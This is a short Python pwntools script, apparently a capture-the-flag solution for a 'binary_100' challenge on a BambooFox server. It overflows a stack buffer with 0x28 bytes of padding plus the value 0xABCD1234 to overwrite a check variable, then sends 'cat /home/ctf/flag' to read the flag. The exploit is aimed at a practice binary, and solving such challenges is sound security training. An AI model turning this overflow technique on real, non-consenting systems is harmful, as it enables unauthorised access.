#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import struct
from pwn import *

context.log_level = 'debug'

fn = './binary_100'

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 22001)

offset = 0x34 - 0xC

payload = 'a' * offset + struct.pack('<I', 0xABCD1234)

io.sendline(payload)

sleep(0.1)

io.sendline('cat /home/ctf/flag')

print io.recv(1)

io.close()
# io.interactive()
